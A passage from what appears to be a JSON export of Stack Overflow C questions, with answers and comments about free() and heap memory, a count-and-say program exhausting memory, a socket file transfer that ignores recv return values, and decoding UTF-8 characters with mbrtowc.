"edited": false, "score": 2, "creation_date": 1524673085, "post_id": 50026722, "comment_id": 87070157, "body": "The memory has been released to the heap, but the heap may not have released it to the system. It doesn&#39;t have to."}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1524676134, "post_id": 50026722, "comment_id": 87071760, "body": "if you on linux run your program under valgrind. That will really tell you if the memory is released or not"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1524676233, "post_id": 50026722, "comment_id": 87071806, "body": "Welcome to Stack Overflow! <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc/605858#605858\">Do I cast the return of malloc ?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 9095, "user_id": 8542346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11b206b49cec657d28a5876f8330780e?s=128&d=identicon&r=PG&f=1", "display_name": "H.S.", "link": "https://stackoverflow.com/users/8542346/h-s"}, "is_accepted": false, "score": 1, "last_activity_date": 1525147689, "last_edit_date": 1525147689, "creation_date": 1524675965, "answer_id": 50027756, "question_id": 50026722, "link": "https://stackoverflow.com/questions/50026722/why-free-for-array-of-poiters-does-not-deallocate-memory/50027756#50027756", "title": "Why free() for array of poiters does not deallocate memory?", "body": "<p>The behavior of <code>free()</code> depend on its underlying implementation. Most of the implementations of <code>free()</code>does not return the freed memory back to the OS but just gives the memory back to the pool, from which the <code>malloc</code> requests are satisfied, which simply means the freed memory is now available to reuse by the program. Check <a href=\"http://c-faq.com/malloc/freetoOS.html\" rel=\"nofollow noreferrer\"><strong>this</strong></a>.</p>\n"}], "owner": {"reputation": 1, "user_id": 9698601, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06e0786d7d03ca6ff25a28325d6c6c7a?s=128&d=identicon&r=PG&f=1", "display_name": "dulef123", "link": "https://stackoverflow.com/users/9698601/dulef123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1525147689, "creation_date": 1524672212, "question_id": 50026722, "link": "https://stackoverflow.com/questions/50026722/why-free-for-array-of-poiters-does-not-deallocate-memory", "title": "Why free() for array of poiters does not deallocate memory?", "body": "<p>I'm trying to free memory after pointers array as in a following code:</p>\n\n<pre><code>int ** t = (int**) malloc(sizeof(int*)*10000000);\nprintf(\"1\\n\");\ngetchar();\nfor(int i =0; i &lt; 10000000; i++){\n    t[i] = (int*) malloc(sizeof(int));\n    *t[i] = i;\n}\nprintf(\"2\\n\");\ngetchar();\n\nfor(int i =0; i &lt; 10000000; i++){\n    free(t[i]);\n}\nprintf(\"3\\n\");\ngetchar();\n\nfree(t);\nprintf(\"4\\n\");\ngetchar();\n</code></pre>\n\n<p>During the execution my system monitor shows me some strange values. When specific numbers are displayed (as in the code) i get following memory usage.</p>\n\n<ol>\n<li>148K</li>\n<li>390,540K</li>\n<li>390,540K</li>\n<li>312,676K</li>\n</ol>\n\n<p>I'm a bit confused. Why numbers in 2 and 3 are the same? Am I doing something wrong, or system monitor is inaccurate? If it is fault of SM then why it noticed difference between 3 and 4?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1524673588, "post_id": 50026717, "comment_id": 87070474, "body": "I think you would do well to put a <code>printf(&quot;i=%d, len=%d\\n&quot;, i, len);</code> at the top of your loop, immediately after the (unnecessary) <code>strlen</code> invoke. You&#39;d be surprised how much memory this used, and how fast it uses it. Something tells me your algorithm has... issues."}, {"owner": {"reputation": 169, "user_id": 3094117, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78e4d79349251b2d1de87a5739c16140?s=128&d=identicon&r=PG&f=1", "display_name": "52coder", "link": "https://stackoverflow.com/users/3094117/52coder"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1524674097, "post_id": 50026717, "comment_id": 87070742, "body": "@WhozCraig thanks for your advice,i will see  this tomorrow,it&#39;s late ,must to sleep now. thanks again."}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "edited": false, "score": 0, "creation_date": 1524679369, "post_id": 50026717, "comment_id": 87073450, "body": "Don&#39;t cast the value returned from <code>malloc()</code>. If you have the correct prototype in scope the cast is useless; if you do not have the correct prototype in scope, the cast is likely to silence any helpful warning the compiler might otherwise have provided."}], "answers": [{"tags": [], "owner": {"reputation": 33990, "user_id": 14768, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/b6aMa.png?s=128&g=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/14768/joshua"}, "is_accepted": false, "score": 0, "last_activity_date": 1552247687, "creation_date": 1552247687, "answer_id": 55091769, "question_id": 50026717, "link": "https://stackoverflow.com/questions/50026717/a-c-solution-for-leetcode-38-count-and-say-confuse-me/55091769#55091769", "title": "A c solution for leetcode 38 count and say confuse me", "body": "<p>You ran out of memory.</p>\n\n<p>Every pass around the loop <code>for(int i = 2; i &lt;= n; ++i)</code> potentially doubles the size of <code>res</code>, and you called it with <code>n == INT_MAX</code>. Ain't no computer in the universe that can allocate <code>1&lt;&lt;INT_MAX</code> bytes of RAM.</p>\n\n<p>The problem statement says to run for <code>n == 30</code>. Your output suggests enough RAM to run for 30.</p>\n"}], "owner": {"reputation": 169, "user_id": 3094117, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78e4d79349251b2d1de87a5739c16140?s=128&d=identicon&r=PG&f=1", "display_name": "52coder", "link": "https://stackoverflow.com/users/3094117/52coder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 124, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1552247687, "creation_date": 1524672193, "last_edit_date": 1524680354, "question_id": 50026717, "link": "https://stackoverflow.com/questions/50026717/a-c-solution-for-leetcode-38-count-and-say-confuse-me", "title": "A c solution for leetcode 38 count and say confuse me", "body": "<p>here is the problem <a href=\"https://leetcode.com/problems/count-and-say/description/\" rel=\"nofollow noreferrer\">count and say</a>\nmy accept code below here. I wrote the main function,when submit just copy the countAndSay function.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar* countAndSay(int n) \n{\n    if( n == 1 ) \n        return \"1\";\n    char *cur = (char *)malloc(2*sizeof(char));\n    char *res;\n    cur[0]='1';\n    cur[1]='\\0';\n\n    int len, idx, j, count;\n    for(int i = 2; i &lt;= n; ++i)\n    {\n       len = strlen(cur);\n       res = (char *)malloc(len * 2 + 1);\n       memset(res, '\\0', len * 2 + 1);\n       count = 1;\n       for(idx = 1, j = 0; idx &lt; len; ++idx)\n       {\n          if(cur[idx] == cur[idx-1])\n          {\n             ++count;\n          }\n          else\n          {\n             res[j++] = '0' + count;\n             res[j++] = cur[idx-1];\n             count = 1;\n          }\n       }//end of for\n\n       res[j++] = '0' + count;\n       res[j++] = cur[len-1];\n       free(cur);\n       cur = res;\n    }   \n    return cur;\n}\n\nint main()\n{\n   char *s = countAndSay(INT_MAX);\n   printf(\"%s\\n\",s);\n   free(s); \n   return 0;\n}\n</code></pre>\n\n<p>This code i saw from the discuss part and modfiy part of it.I just confused\nwhy use res[j++] = '0' + count since count may be 11 or 12,when count bigger than 9,res[j++] is not a char between '0' and '9',so i ran the code,and it went wrong.\n<a href=\"https://i.stack.imgur.com/cowGx.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/cowGx.png\" alt=\"enter image description here\"></a></p>\n\n<p>ctci(1720,0x100392380) malloc: <strong>* mach_vm_map(size=18446744071713468416) failed (error code=3)\n*</strong> error: can't allocate region\n*** set a breakpoint in malloc_error_break to debug\nProgram ended with exit code: 9</p>\n\n<p>i guess may be the series is too long,my computer's memory not enough.So i change the num to 500,still got wrong.</p>\n\n<p>Just can not figuer out why.</p>\n\n<p>following the advice of @WhozCraig,i print the len to malloc,here is the result.</p>\n\n<pre><code>1\n2\n2\n4\n6\n6\n8\n10\n14\n20\n26\n34\n46\n62\n78\n102\n134\n176\n226\n302\n408\n528\n678\n904\n1182\n1540\n2012\n2606\n3410\n4462\n5808\n7586\n9898\n12884\n16774\n21890\n28528\n37158\n48410\n63138\n82350\n107312\n139984\n182376\n237746\n310036\n403966\n526646\n686646\n894810\n1166642\n1520986\n1982710\n2584304\n3369156\n4391702\n5724486\n7462860\n9727930\n12680852\n16530884\n21549544\n28091184\n36619162\n47736936\n62226614\n81117366\n105745224\n137842560\n179691598\n234241786\n305351794\n398049970\n518891358\n676414798\n881752750\n1149440192\nctci(1828,0x100392380) malloc: *** mach_vm_map(size=18446744071713468416) failed (error code=3)\n*** error: can't allocate region\n*** set a breakpoint in malloc_error_break to debug\nProgram ended with exit code: 9\n</code></pre>\n\n<p>so 1149440192B ,1149440192/(1024*1024)MB=1096MB,i just watch the memory left,it is bigger than 1096.1915893555MB.</p>\n"}, {"tags": ["c", "sockets", "recv", "sendfile"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1524673583, "post_id": 50026683, "comment_id": 87070468, "body": "<code>&#47;* Check if file exists *&#47;             if(access(retrFileName, F_OK)</code> is completely useless.  Even if the <code>access()</code> call succeeds, the later <code>open()</code> call can fail.  Doing X to try to make sure Y will work later is almost always a bad idea - for one, it&#39;s <a href=\"https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use\" rel=\"nofollow noreferrer\">a TOCTOU bug</a>.  Just call <code>open()</code> and handle any failure - you have to do that anyway."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 1, "creation_date": 1524708992, "post_id": 50026683, "comment_id": 87083845, "body": "Why are you looping while <code>sendfile()</code> returns 512? It can return <i>any</i> positive number &lt;= the stated buffer size."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524769168, "post_id": 50026683, "comment_id": 87116570, "body": "we will have a difficult time recreating your bug, because all that is posted is code snippets.  Please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> for the client and for the server"}], "answers": [{"comments": [{"owner": {"reputation": 123, "user_id": 9617304, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "boludo kid", "link": "https://stackoverflow.com/users/9617304/boludo-kid"}, "edited": false, "score": 0, "creation_date": 1524680015, "post_id": 50027020, "comment_id": 87073766, "body": "i am having the same problem with your solution. When i go <code>printf(&quot;bytesleidos: %li, contador: %d:\\n%s\\n\\n&quot;, bytesLeidos, contador, readingBuffer);</code> for the first time, it prints something different from the beginning of the original file. Also, the loop don&#39;t end; the client output ends with  <b>bytesleidos: 103, contador: 2151:</b> (and my original file size is 3062)  Also, the server (or the client idk) write into the new file the message sent after sending(recieving) the file"}, {"owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "reply_to_user": {"reputation": 123, "user_id": 9617304, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "boludo kid", "link": "https://stackoverflow.com/users/9617304/boludo-kid"}, "edited": false, "score": 0, "creation_date": 1524707332, "post_id": 50027020, "comment_id": 87083448, "body": "My psychic powers suggest that are you forgetting to null terminate <code>readingBuffer</code> with a zero.  Literally add this line <code>readBuffer[bytesLeidos] = &#39;\\0&#39;;</code> before the <code>printf</code> statement."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1524708967, "post_id": 50027020, "comment_id": 87083836, "body": "No. Change the <code>printf()</code> to <code>printf(&quot;bytesleidos: %li, contador: %d:\\n%.*s\\n\\n&quot;, bytesLeidos, contador, bytesLeidos, readingBuffer)</code>. You should not mess with the read buffer."}, {"owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "edited": false, "score": 0, "creation_date": 1524722860, "post_id": 50027020, "comment_id": 87087704, "body": "The printf statement change is a good idea. But null terminating the read buffer also makes debugging easier - especially for text protocols. We&#39;re already programming in &quot;C&quot;, so the safety belts are already off..."}, {"owner": {"reputation": 123, "user_id": 9617304, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "boludo kid", "link": "https://stackoverflow.com/users/9617304/boludo-kid"}, "edited": false, "score": 0, "creation_date": 1524859578, "post_id": 50027020, "comment_id": 87155613, "body": "Still having the problem. When i boot my computer the program works perfectly. The problem is after the first try, the client (i guess) don&#39;t recieve the full file correctly"}, {"owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "edited": false, "score": 0, "creation_date": 1524861046, "post_id": 50027020, "comment_id": 87156196, "body": "What have you done to debug to understand the issue? Do you think the issue is on server or client?"}], "tags": [], "owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "is_accepted": false, "score": 4, "last_activity_date": 1524707627, "last_edit_date": 1524707627, "creation_date": 1524673231, "answer_id": 50027020, "question_id": 50026683, "link": "https://stackoverflow.com/questions/50026683/not-sending-file-correctly-sockets-c/50027020#50027020", "title": "Not sending file correctly. Sockets. C", "body": "<p>Golden rule of socket programming: Always check the return value from <code>recv</code>. It's not always what you think it will be.</p>\n\n<p>Even though you \"send\" 512 bytes at a time, you are in no way guaranteed that TCP will deliver the same number of bytes at a time to the receiver.  TCP segmentation, IP fragmentation, and general Internet weirdness will cause the recv side to get an arbitrary number of bytes at a time.</p>\n\n<p>Hence, your hardcoded assumption that <code>recv</code> will always return 512 is incorrect:</p>\n\n<pre><code>remainData -= 512;\ncontador += 512;\n</code></pre>\n\n<p>Instead, you should be saying:</p>\n\n<pre><code>remainData -= bytesLeidos;\ncontador += bytesLeidos;\n</code></pre>\n\n<p>An you need to check for errors and socket closing too.  </p>\n\n<p>This is an improved main loop for your client code:</p>\n\n<pre><code>while (remainData &gt; 0)\n{\n    size_t recvSize = (remainData &gt;= 512) ? 512 : remainData;\n    bytesLeidos = recv(clientSock, readingBuffer, recvSize, 0);\n    if (bytesLeidos &gt; 0)\n    {\n        fwrite(readingBuffer, bytesLeidos, 1, receivedFile);\n        remainData -= bytesLeidos;\n        contador += bytesLeidos;\n\n        /* null terminate readingBuffer so garbage isn't printed.*/\n        /* Make sure readingBuffer is allocated to be at least */\n        /*  N+1 bytes (513) to account for this character being appended. */\n\n        readingBuffer[bytesLeidos] = '\\0'; \n        printf(\"bytesleidos: %li, contador: %d:\\n%s\\n\\n\", bytesLeidos, contador, readingBuffer);\n    }\n    else if (bytesLeidos == 0)\n    {\n        /* remote side closed connection */\n        printf(\"Remote side exited connection\\n\");\n        break;   \n    }\n    else if (bytesLeidos &lt; 0)\n    {\n         /* connection error */\n        printf(\"Connection error\\n\");\n        break;   \n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123, "user_id": 9617304, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "boludo kid", "link": "https://stackoverflow.com/users/9617304/boludo-kid"}, "is_accepted": true, "score": 0, "last_activity_date": 1526488889, "creation_date": 1526488889, "answer_id": 50376062, "question_id": 50026683, "link": "https://stackoverflow.com/questions/50026683/not-sending-file-correctly-sockets-c/50376062#50376062", "title": "Not sending file correctly. Sockets. C", "body": "<p>I solved my problem!! I needed to sync both client and server. To do so, the server send the size of the file and waits for an answer for the client with <code>recv</code>. When the client recieve the file size, it <code>send</code> a \"\" message. </p>\n\n<p>I don't know if this is the correct solution, but this way you can sync server and client. </p>\n\n<p>After sync, the server send the respective file normally with <code>sendfile</code></p>\n"}], "owner": {"reputation": 123, "user_id": 9617304, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "boludo kid", "link": "https://stackoverflow.com/users/9617304/boludo-kid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 299, "favorite_count": 0, "accepted_answer_id": 50376062, "answer_count": 2, "score": 2, "last_activity_date": 1526488889, "creation_date": 1524672069, "question_id": 50026683, "link": "https://stackoverflow.com/questions/50026683/not-sending-file-correctly-sockets-c", "title": "Not sending file correctly. Sockets. C", "body": "<p>I am writing a program that a client can ask for files to a server. Then the server will send them in chunks of 512 bytes. The problem is that when the client read the file:</p>\n\n<p>*Sometimes the first 512 bytes are different from the original file. The total read file also has a different size (and obviously it also ends different from the original file) and therefore the client loop that writes to the new file does never end.</p>\n\n<p>*Sometimes it works perfectly and i don't know why.</p>\n\n<p><strong>Server:</strong></p>\n\n<pre><code>            /* Check if file exists */\n            if(access(retrFileName, F_OK) == 0){\n\n                /* Open file */\n                fd = open(retrFileName, O_RDONLY); \n                lseek(fd, 0, SEEK_SET);\n                if (fd == -1){\n                        fprintf(stderr, \"Error opening file --&gt; %s\", strerror(errno));\n\n                        exit(EXIT_FAILURE);\n                }\n\n                /* Get file stats */\n                if (fstat(fd, &amp;fileStat) &lt; 0){\n                        fprintf(stderr, \"Error fstat --&gt; %s\", strerror(errno));\n                        exit(EXIT_FAILURE);\n                }\n\n                sprintf(fileSize, \"%li\", fileStat.st_size);\n\n                /* Sending file data */\n                offset = 0;\n                remainData = fileStat.st_size;\n                while (((sentBytes = sendfile(clientSock, fd, &amp;offset, 512)) == 512) &amp;&amp; (remainData &gt; 0)) {\n                        remainData -= sentBytes;\n                        fprintf(stdout, \"Server envio %d bytes del file, offset ahora vale: %li y quedan = %d bytes\\n\", sentBytes, offset, remainData);\n                }\n                remainData -= sentBytes;\n                fprintf(stdout, \"Server envio %d bytes del file, offset ahora vale: %li y quedan = %d bytes\\n\", sentBytes, offset, remainData);//do while\n                close(fd);////////////////////////\n                send(clientSock, NICETRANSFER, sizeof(NICETRANSFER), 0); //LO METE AL ARCHIVO\n                printf(\"send\\n\");\n                //close(clientSock);///////////\n\n            }\n            else{\n                send(clientSock, FILEERROR, sizeof(FILEERROR), 0);\n                printf(\"send\\n\");\n            }\n\n\n        }\n</code></pre>\n\n<p><strong>Client:</strong></p>\n\n<pre><code>/* Open file */\n            receivedFile = fopen(\"r.txt\", \"wb\");\n            if (receivedFile == NULL){\n                fprintf(stderr, \"Failed to open file --&gt; %s\\n\", strerror(errno));\n\n                exit(EXIT_FAILURE);\n            }\n\n            /* Write to the file */\n            int contador = 0;\n            int remainData = fileSize;\n            do{\n                if(remainData &lt; 512)\n                    bytesLeidos = recv(clientSock, readingBuffer, remainData, 0);\n                else\n                    bytesLeidos = recv(clientSock, readingBuffer, 512, 0);\n\n                fwrite(readingBuffer, bytesLeidos, 1, receivedFile);\n\n                remainData -= 512;\n                contador += 512;\n                printf(\"bytesleidos: %li, contador: %d:\\n%s\\n\\n\", bytesLeidos, contador, readingBuffer);\n\n            }while(contador &lt; fileSize);\n            fclose(receivedFile);\n</code></pre>\n"}, {"tags": ["c", "linux", "gcc", "buildroot"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1524672296, "post_id": 50026618, "comment_id": 87069740, "body": "codepoint 176 is encoded in a two bytes utf8 sequence: <code>C2 B0</code> you are printing only the first byte of this sequence."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1524673465, "post_id": 50026618, "comment_id": 87070381, "body": "Never use any non-ASCII characters in program source code. Avoid using <code>-unsigned-char</code> in any program that calls standard C library functions."}, {"owner": {"reputation": 18759, "user_id": 2226988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6fbec3a71b2e95e4a6e41478deb379?s=128&d=identicon&r=PG", "display_name": "Tom Blodget", "link": "https://stackoverflow.com/users/2226988/tom-blodget"}, "edited": false, "score": 0, "creation_date": 1524675381, "post_id": 50026618, "comment_id": 87071343, "body": "When you say you want &#176; to be encoded as 176, which character set and encoding do you mean? UTF-8 is a character encoding for the Unicode character set. If you need to match &quot;old DOS&quot;, in English, the character set was likely CP437 but there &#176; is 143."}, {"owner": {"reputation": 335, "user_id": 9698161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a2881d4f88da4ddcd701eccf723006f?s=128&d=identicon&r=PG&f=1", "display_name": "J.Panek", "link": "https://stackoverflow.com/users/9698161/j-panek"}, "edited": false, "score": 0, "creation_date": 1524734588, "post_id": 50026618, "comment_id": 87094701, "body": "I am kinda forced to use non-ASCII characters in program source code since it <b>will be</b> legacy code and should not be changed right now. Will the <code>-unsigned-char</code> compiler flag break any Standard C functions?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524750856, "post_id": 50026618, "comment_id": 87105821, "body": "to start, use <code>wchar</code> not <code>char</code>  and, of course and reading of user input should use the wide char functions and any display should use the wide char functions"}], "answers": [{"comments": [{"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1524674388, "post_id": 50026828, "comment_id": 87070869, "body": "&quot;with mbrtowc&quot; just use <code>L&#39;...&#39;</code> wide characters to get directly to the code points, no conversion needed. But using non-ascii stuff in literals is dangerous, one can use <code>L&#39;\\u1234&#39;</code> notation instead. No wait a minute, why not just <code>\\x1234</code>? Of course one still needs to convert data loaded from a file."}, {"owner": {"reputation": 335, "user_id": 9698161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a2881d4f88da4ddcd701eccf723006f?s=128&d=identicon&r=PG&f=1", "display_name": "J.Panek", "link": "https://stackoverflow.com/users/9698161/j-panek"}, "edited": false, "score": 0, "creation_date": 1524735125, "post_id": 50026828, "comment_id": 87095056, "body": "When I use this approach <code>code</code> will not change to the value in <code>test</code>, instead, it keeps the first assigned value. <code>mbrtowc</code> looks promising, but it seems I cannot get this function to work. Can this be a compiler issue of some sorts? However, will I get the Unicode codepoint from this function or something different?"}, {"owner": {"reputation": 335, "user_id": 9698161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a2881d4f88da4ddcd701eccf723006f?s=128&d=identicon&r=PG&f=1", "display_name": "J.Panek", "link": "https://stackoverflow.com/users/9698161/j-panek"}, "edited": false, "score": 0, "creation_date": 1524738030, "post_id": 50026828, "comment_id": 87096963, "body": "I Forgot to mention that I get -1 as the return value of <code>mbrtowc</code> when I use <code>test = &quot;&#176;&quot;</code> but not when <code>test = &quot;!&quot;</code> or any other ASCII character. When I declare the char unsigned I can at least extract the two bytes of the encoded &quot;&#176;&quot;.<code>printf(&quot;test: %hu\\n&quot;,(USHORT)test[0])</code> prints 194 and <code>printf(&quot;test: %hu\\n&quot;,(USHORT)test[1])</code> prints 176 which is the correct encoding for the char."}], "tags": [], "owner": {"reputation": 7792, "user_id": 249237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QjPtI.png?s=128&g=1", "display_name": "Kninnug", "link": "https://stackoverflow.com/users/249237/kninnug"}, "is_accepted": true, "score": 6, "last_activity_date": 1524679320, "last_edit_date": 1524679320, "creation_date": 1524672590, "answer_id": 50026828, "question_id": 50026618, "link": "https://stackoverflow.com/questions/50026618/getting-wrong-utf-8-values-by-casting-char-into-ushort/50026828#50026828", "title": "Getting wrong UTF-8 values by casting char into USHORT", "body": "<p>A <code>char</code> (<code>signed</code> or <code>unsigned</code>) is a single byte in C <sup>1</sup>. <code>(USHORT)test[0]</code> only casts only the first byte in <code>test</code>, but the character in it occupies 2 in the UTF-8 encoding (you can check that with <code>strlen</code>, which counts the number of bytes before the first 0-byte).</p>\n\n<p>To get the proper code point you need to decode the entire UTF-8 sequence. You can do this with <a href=\"http://man7.org/linux/man-pages/man3/mbrtowc.3.html\" rel=\"nofollow noreferrer\"><code>mbrtowc</code></a> and related functions:</p>\n\n<pre><code>char* test;\ntest = \"\u00b0\";\nint len = strlen(test);\n\nwchar_t code = 0;\nmbstate_t state = {0};\n\n// convert up to len bytes in test, and put the result in code\n// state is used when there are incomplete sequences: pass it to\n// the next call to continue decoding\nmbrtowc(&amp;code, test, len, &amp;state); // you should check the return value\n\n// here the cast is needed, since a wchar_t is not (necessarily) a short\nprintf(\"test: %hu\\n\", (USHORT)code); \n</code></pre>\n\n<p>Side notes: </p>\n\n<ul>\n<li><p>If <code>USHORT</code> is 16 bits (as is commonly the case), it is not strictly enough to cover the entire UTF-8 range, which needs (at least) 21 bits.</p></li>\n<li><p>When you have obtained the proper code point, the cast should not be necessary to pass it to the drawing function. If the function definition or prototype is visible, the compiler can convert the value by itself.</p></li>\n</ul>\n\n<hr />\n\n<p><sup>1</sup> The confusing name comes from the time when <a href=\"http://catb.org/jargon/html/V/vaxocentrism.html\" rel=\"nofollow noreferrer\">all the world's English</a> and all the ASCII code points could fit in a single byte. Hence, a character was the same as a byte.</p>\n"}], "owner": {"reputation": 335, "user_id": 9698161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a2881d4f88da4ddcd701eccf723006f?s=128&d=identicon&r=PG&f=1", "display_name": "J.Panek", "link": "https://stackoverflow.com/users/9698161/j-panek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 211, "favorite_count": 0, "accepted_answer_id": 50026828, "answer_count": 1, "score": 2, "last_activity_date": 1525256238, "creation_date": 1524671853, "last_edit_date": 1525256238, "question_id": 50026618, "link": "https://stackoverflow.com/questions/50026618/getting-wrong-utf-8-values-by-casting-char-into-ushort", "title": "Getting wrong UTF-8 values by casting char into USHORT", "body": "<p>This is my first question here, so feel free to criticize or correct me if I am missing important rules.</p>\n\n<p>Recently I was tasked with porting old DOS C-code to a Linux platform. The Font handling is realized by bitfonts. I wrote a function that is capable to draw the selected glyph if you pass the correct Unicode value into it.</p>\n\n<p>However, if I try to cast the char into a USHORT (functions expects this type) I get the wrong value when the character is outside of the ASCII-table.</p>\n\n<pre><code>char* test;\ntest = \"\u00b0\";\n\nprintf(\"test: %hu\\n\",(USHORT)test[0]);\n</code></pre>\n\n<p>The displayed number 